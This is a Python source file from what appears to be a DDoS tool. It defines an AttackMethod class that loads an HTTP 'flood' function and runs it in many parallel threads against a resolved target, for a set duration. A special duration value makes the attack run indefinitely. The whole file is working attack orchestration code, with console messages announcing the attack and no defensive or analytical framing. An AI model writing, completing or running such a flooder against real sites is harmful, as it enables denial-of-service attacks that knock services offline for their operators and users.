from time import time, sleep
from threading import Thread
from colorama import Fore
from humanfriendly import format_timespan, Spinner
from tools.crash import CriticalError
from tools.ipTools import GetTargetAddress, InternetConnectionCheck


def GetMethodByName(method):
    dir = "tools.L7.http"
    module = __import__(dir, fromlist=["object"])
    if hasattr(module, "flood"):
        method = getattr(module, "flood")
        return method
    else:
        CriticalError(
            f"Method 'flood' not found in {repr(dir)}. Uses Python 3.8", "-"
        )

class AttackMethod:

    # Constructor
    def __init__(self, duration, threads, target):
        self.name = str("HTTP")
        self.duration = duration
        self.threads_count = threads
        self.target_name = target
        self.target = target
        self.threads = []
        self.is_running = False

    # Entrada
    def __enter__(self):
        InternetConnectionCheck()
        self.method = GetMethodByName(self.name)
        self.target = GetTargetAddress(self.target_name, self.name)
        return self

    # Saida
    def __exit__(self, exc_type, exc_val, exc_tb):
        print(f"{Fore.MAGENTA}[!] {Fore.BLUE}! STOP FULL ATTACK !{Fore.RESET}")

    # Verifica de tempo de execução
    def __RunTimer(self):
        if ( self.duration == 159357):
            self.duration = float('inf')
            print("\33[33m"+" ~ ~ ~ ~ ~ "+"\33[33m")
        else:
            pass
        __stopTime = time() + self.duration
        while time() < __stopTime:
            if not self.is_running:
                return
            sleep(1)
        self.is_running = False

    # Inicia o flooder
    def __RunFlood(self):
        while self.is_running:
            self.method(self.target)

    # threads
    def __RunThreads(self):
        # Start thread time
        thread = Thread(target=self.__RunTimer)
        thread.start()
        for _ in range(self.threads_count):
            thread = Thread(target=self.__RunFlood)
            self.threads.append(thread)
        # Start thread flooding
        with Spinner(
            label=f"{Fore.YELLOW} Starting {self.threads_count} threads {Fore.RESET}",
            total=100,
        ) as spinner:
            for index, thread in enumerate(self.threads):
                thread.start()
                spinner.step(100 / len(self.threads) * (index + 1))
        # Wait for the thread flood to end
        for index, thread in enumerate(self.threads):
            thread.join()
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}Thread parada {index + 1}.{Fore.RESET}"
            )

    # DDOS attack
    def Start(self):
        target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
        if (self.duration == 159357):
            print(f"{Fore.MAGENTA}[?] {Fore.BLUE} Starting the {target} attack using the method {self.name}.{Fore.RESET}\n")
        else:
            duration = format_timespan(self.duration)
            print(f"{Fore.MAGENTA}[?] {Fore.BLUE} Starting the {target} attack using the method {self.name}.{Fore.RESET}\n"
 f"{Fore.MAGENTA}[?] {Fore.BLUE} The attack will stop after {Fore.MAGENTA}{duration}{Fore.BLUE}.{Fore.RESET}"
)
        self.is_running = True
        try:
            self.__RunThreads()
        except KeyboardInterrupt:
            self.is_running = False
            print(
                f"\n{Fore.RED}[!] {Fore.MAGENTA}!!! Ctrl+C detected. STOPPING !!!{self.threads_count} threads..{Fore.RESET}"
            )
            # Wait to end
            for thread in self.threads:
                thread.join()
        except Exception as err:
            print(err)